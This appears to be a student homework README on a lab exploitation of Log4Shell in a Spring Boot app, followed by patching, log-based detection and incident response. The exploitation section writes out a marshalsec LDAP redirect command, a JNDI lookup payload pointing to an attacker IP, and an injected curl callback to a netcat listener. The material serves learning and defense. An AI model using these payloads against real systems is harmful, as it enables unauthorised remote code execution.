# Week9: Log4Shell Vulnerability Homework

## Introduction 
This project demonstrates the exploitation and mitigation of the Log4Shell vulnerability (CVE-2021-44228) using a vulnerable Java Spring Boot application deployed via Docker Compose. The objectives of this homework are:

- Simulate a real-world Log4Shell exploit scenario
- Apply MITRE ATT&CK, DEFEND, and REACT frameworks
- Harden and redeploy the application using secure coding practices

---

## Prerequisites
- Docker & Docker Compose
- Java + Maven (if building manually)
- Python 3 (for attacker LDAP simulation)
Also, Ports 8000, 8080, 1389 and 389 are open in your EC2 Security Group (for the app and LDAP server).

---

## Part 1: Exploitation (MITRE ATT&CK)
After launching the ldap app "python3 ldap_server.py"  i received this error: ldap3.core.exceptions.LDAPSocketOpenError: socket connection error while opening: [Errno 111] Connection refused; after researching this error, i came to the point of using marshalsec, which is a malicious LDAP redirect server, not a real LDAP directory; i cloned it (git clone https://github.com/mbechler/marshalsec.git) then built it. I then ran manually these commands 
### HTTP server (for payload)
cd exploit/
python3 -m http.server 8000

### LDAP redirect server
java -cp marshalsec-*.jar marshalsec.jndi.LDAPRefServer http://<your-ip>:8000/#Exploit
To exploit the Log4Shell vulnerability, a vulnerable Spring Boot app using Log4j was set up to log user input. A malicious LDAP server was launched using marshalsec to redirect requests to an HTTP server hosting a malicious Exploit.class. The exploit payload ${jndi:ldap://<attacker-ip>:1389/Exploit} was sent via a POST request to the app’s /log endpoint. When the app logged this input, it triggered the JNDI lookup, causing the app to connect to the LDAP server. This demonstrated remote code loading behavior, confirming the Log4Shell vulnerability's exploitation path from input to remote callback.

Proof of vulnerability exploitation:
![image](https://github.com/user-attachments/assets/892533b0-5fb8-49f6-9acd-80159a2bc812)
nc -lvnp 9999 listener received a connection from the target app's IP (Connection received on 164.52.0.91 51287); The incoming payload shows garbled data and headers (xterm-256color, hostname, etc.), indicating that the curl http://44.208.30.186:9999/ executed successfully inside the vulnerable app. 

To summarize What Just Happened
- the vulnerable Spring Boot app logged: {"input": "${jndi:ldap://44.208.30.186:1389/Exploit}"}
- That triggered a request to your rogue LDAP server (marshalsec).
- The LDAP server instructed the app to load a malicious .class file from your HTTP server.
- The malicious .class file contained: Runtime.getRuntime().exec("curl http://<attacker>:9999/");
- The target executed that, reaching your port 9999, confirming Remote Code Execution (RCE).

the file start_exploit.sh available in the exploit folder automates all this process.

## Part 2: Defense (MITRE DEFEND)
- Log4j upgraded to 2.17.0.
- Input validation implemented to block JNDI patterns.

To do this, we need to:
- Replace vulnerable LogController.java with patched/LogController.java.
- Upgrade log4j version to 2.17.0 in pom.xml.
- 
before: ![image](https://github.com/user-attachments/assets/70fa2a88-26a0-4531-af5c-fcfacad41415)

after: ![image](https://github.com/user-attachments/assets/cc7b0dfe-1943-4a31-a93d-7d90533207ea) 

- Rebuild and restart: the result is as follow: ![image](https://github.com/user-attachments/assets/e8071e43-2160-4ec0-a7a5-b6e1f92bf70f)

That confirms the patch is working; the pdated application successfully blocked the Log4Shell exploit attempt.
What Just Happened: we sent the malicious payload {"input": "${jndi:ldap://44.208.30.186:1389/Exploit}"} ; The updated LogController.java now includes input validation that detects and blocks JNDI injection attempts and the app returned: Blocked suspicious input!

Testing with normal input returns Logged: Hello World!

![image](https://github.com/user-attachments/assets/4204f54e-a58b-45e4-8ab9-7082524fbea8)

  


## Part 3: Response (MITRE REACT)
- Detect: Logs examined for exploit traces: docker logs $(docker ps -qf "name=app") 2>&1 | grep jndi
![image](https://github.com/user-attachments/assets/e4351711-9a18-4c52-832a-02a0572a6bd1)

 This returned nothing, which is good sign, because we are currently running the patched app; it also means the patched application successfully blocked the malicious input and did not log or process the ${jndi:...} payload.


- Contain: Vulnerable container stopped
  If we were running the unpatched app, it would have been good to contain the vulnerable container by running: docker-compose down
  
- Eradicate: Patched container deployed; here we have to ensure that patched code is deployed. We did this on part2
  
- Recover: System restored with mitigation verified; this consists of restart and test with clean input: docker-compose up --build -d
This was also done in part2

---

## Conclusion and Lessons Learned

Working through the Log4Shell vulnerability really drove home some key points about building secure software. It's easy to forget about things like logging libraries (like Log4j), but they're definitely part of what attackers can target. As we saw, just one little piece of data that's not handled correctly can open the door for someone to run code remotely if the logging system has a flaw. This really shows why it's so important to keep all our software up to date and to know what the third-party tools we're using actually do.

Plus, it's clear that we absolutely have to check everything that comes into our applications, even if it's going to internal parts. The fixed version we looked at successfully stopped malicious attacks just by cleaning up the input it received, proof that even simple checks can make a big difference!

Lastly, tools like MITRE ATT&CK and D3FEND give us a great way to think about security throughout the whole lifecycle, from finding weaknesses to fixing them and responding if something happens. They're super helpful for anyone working in cybersecurity today. This whole exercise really reinforces that being proactive with our defenses, having a good understanding of how our systems are put together, and constantly keeping an eye on things are crucial for keeping our systems secure


---

## References

- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [MITRE DEFEND](https://defend.mitre.org/)
- [MITRE REACT](https://www.mitre.org/publications/technical-papers/react-a-framework-for-incidence-response)

